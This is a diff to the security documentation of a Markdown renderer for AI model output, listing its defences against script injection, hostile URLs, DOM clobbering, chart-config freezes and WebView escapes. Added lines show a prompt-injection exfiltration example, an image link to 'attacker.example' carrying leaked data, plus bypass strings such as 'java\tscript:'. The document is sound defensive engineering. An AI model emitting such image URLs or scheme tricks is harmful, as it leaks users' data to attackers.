@@ -6,7 +6,7 @@ The rule is simple: **nothing in the Markdown may run code, load from a host the
 the page outside the rendered block.**
 
 Every rule below is tested in a real browser on the web renderer, the React Native renderer and the WebView documents:
-see [test-report.md](test-report.md) (24 attack payloads) and `npm run e2e`.
+see [test-report.md](test-report.md) (27 attack payloads) and `npm run e2e`.
 
 ## Where the rules live
 
@@ -17,8 +17,8 @@ ones. They are exported, so you can reuse them.
 |---|---|---|
 | Links and images | `sanitizeMarkdownUrl`, `ALLOWED_URL_PROTOCOLS`, `stripProtocolRelativeMarkdownLinks` | [src/core/security.ts](../src/core/security.ts) |
 | Raw HTML (web) | `ALLOWED_HTML_TAGS` on top of Streamdown's sanitizer, then `rehypeUrlPolicy` | [src/core/security.ts](../src/core/security.ts), [src/web/rehype-url-policy.ts](../src/web/rehype-url-policy.ts) |
-| Mermaid | `MERMAID_CONFIG`, `stripMermaidConfigOverrides`, `withMermaidSourceGuard` | [src/core/security.ts](../src/core/security.ts) |
-| KaTeX | `KATEX_SECURITY_OPTIONS`, `withKatexSecurity` | [src/core/security.ts](../src/core/security.ts) |
+| Mermaid | `MERMAID_CONFIG`, `stripMermaidConfigOverrides`; `withMermaidSourceGuard` (web) | [src/core/security.ts](../src/core/security.ts), [src/web/plugins.ts](../src/web/plugins.ts) |
+| KaTeX | `KATEX_SECURITY_OPTIONS`; `withKatexSecurity` (web) | [src/core/security.ts](../src/core/security.ts), [src/web/plugins.ts](../src/web/plugins.ts) |
 | ECharts | `parseEChartsSource`, `hardenEChartsOption`, `ECHARTS_LIMITS`, allowlists | [src/core/echarts-security.ts](../src/core/echarts-security.ts) |
 | React Native WebView | CSP, SRI, `allowWebViewRequest` | [src/native/webview-html.ts](../src/native/webview-html.ts), [src/native/rich-block.tsx](../src/native/rich-block.tsx) |
 
@@ -31,12 +31,15 @@ ones. They are exported, so you can reuse them.
   `<script>`, `<iframe>`, `<style>`, `<meta>`, `<form>`, `<button>`, `<picture>`/`<source>` and every event handler
   (`onerror`, `onload`, …) are removed. Extra tags allowed because models use them: `br`, `sub`, `sup`, `mark`,
   `details`, `summary`. `<input>` survives only as a disabled checkbox (task lists), so a fake login form cannot be built.
+  `id` and `name` get a `user-content-` prefix (and `aria-*` references with them), so `<div id="root">` cannot shadow
+  `window.root` or the host page's own elements (DOM clobbering).
 - **React Native:** HTML is never rendered as HTML. Only its text is shown, with `<script>` and `<style>` contents
   dropped; `<mark>`, `<sub>`, `<sup>` and `<br>` are honored as styles.
 
 ### 2. Links and images
 
-- Allowed: `http:`, `https:`, `mailto:`, and relative URLs / anchors. Everything else — `javascript:`, `vbscript:`,
+- Allowed: `http:`, `https:`, `mailto:`, and relative URLs / anchors. URLs are judged the way the browser will read
+  them: tab, CR and LF are removed and `\` counts as `/`, so `java\tscript:` and `/\evil.example` are refused too. Everything else — `javascript:`, `vbscript:`,
   `file:`, `data:`, unknown schemes, and protocol-relative `//host` — is dropped. Upper case and leading spaces
   (`  JavaScript:`) do not get around it.
 - `//host` destinations are rewritten to `#` before parsing, so no later step can mistake them for a path.
@@ -48,8 +51,10 @@ ones. They are exported, so you can reuse them.
   referrer. Footnote links scroll inside their own view and do not change the page URL.
 - On React Native, a link press goes to `onLinkPress` first; by default only http(s) / mailto open in the browser, and
   relative URLs only with a `baseUrl`.
-- Images from any http(s) host are shown, like other Markdown renderers do: models attach generated and uploaded
-  images. Restrict hosts with your own `components.img` (web) or a `baseUrl` + `onLinkPress` policy (native) if needed.
+- Images from any http(s) host are shown by default, like other Markdown renderers do: models attach generated and
+  uploaded images. But an image URL is also how a prompt injection leaks data — `![](https://attacker.example/?q=…)` is
+  requested as soon as it renders. Pass `isImageAllowed` (web and native) to allow only your hosts; a refused image
+  shows its alt text and is never requested.
 
 ### 3. Mermaid
 
@@ -86,7 +91,9 @@ HTML, and opens title / node links with `window.open`.
    `nodeClick: 'link'` becomes `false`; `image`, `extraCssText`, `image://…` symbols and `url(…)` values are removed.
 5. **No HTML.** Every string loses its tags and stray `<` `>` (an unclosed `<img … onerror` would otherwise be closed
    by ECharts' own markup); every tooltip at any depth is forced to `renderMode: 'richText'`.
-6. **Limits.** 1,000,000 characters, 50 series, 20,000 data points (series data, graph / sankey nodes, links and
+6. **No runaway loops.** `splitNumber` is capped at 100 anywhere (a gauge with `splitNumber: 100000000` would freeze
+   the page) and axis tick steps (`interval`, `minInterval`, `maxInterval`) are removed, letting ECharts choose them.
+7. **Limits.** 1,000,000 characters, 50 series, 20,000 data points (series data, graph / sankey nodes, links and
    edges, nested `children`, `dataset.source`). Over a limit, the source is shown instead of a chart.
 
 ### 6. React Native WebView
@@ -95,11 +102,12 @@ Display math, Mermaid and ECharts are drawn in `react-native-webview` (only when
 
 - The content is passed as JSON in a `<script type="application/json">` with `<`, `>`, `&`, U+2028/2029 escaped —
   never as markup.
-- A Content-Security-Policy allows scripts only from the pinned script origin (math: KaTeX's stylesheet and fonts only from
-  theirs), no other network access, `img-src data:`.
+- A Content-Security-Policy allows exactly the pinned script file (math: exactly KaTeX's stylesheet and its fonts
+  folder) — not the rest of the CDN — no other network access, `img-src data:`.
 - Scripts and the KaTeX stylesheet load from pinned jsDelivr URLs with **Subresource Integrity** (a modified file is
   refused: diagrams and charts show their source, math falls back to MathML). Self-host with the `scripts` prop.
-- No navigation away from the document, no file access, no new windows; the page can only report its height.
+- No navigation away from the document (not even to a `data:` page, which would have no CSP), no file access, no new
+  windows; the page can only report its height.
 - Mermaid / ECharts options get the same hardening as on the web, applied in the app before the WebView sees them.
   Math is rendered by KaTeX in the app; its WebView runs no script from the network.
 
